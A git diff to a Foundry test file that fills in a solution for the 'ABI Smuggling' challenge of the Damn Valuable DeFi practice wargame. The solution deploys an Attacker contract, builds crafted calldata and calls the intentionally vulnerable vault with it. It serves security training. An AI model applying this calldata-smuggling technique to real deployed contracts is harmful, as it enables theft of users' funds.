@@ -4,7 +4,9 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
+import {
+    SelfAuthorizedVault, AuthorizedExecutor, IERC20, Attacker
+} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
 
 contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -72,7 +74,12 @@ contract ABISmugglingChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_abiSmuggling() public checkSolvedByPlayer {}
+    function test_abiSmuggling() public checkSolvedByPlayer {
+        Attacker attacker = new Attacker(vault, address(token), recovery);
+        bytes memory payload = attacker.attack();
+        (bool success,) = address(vault).call(payload);
+        require(success, "Call failed");
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
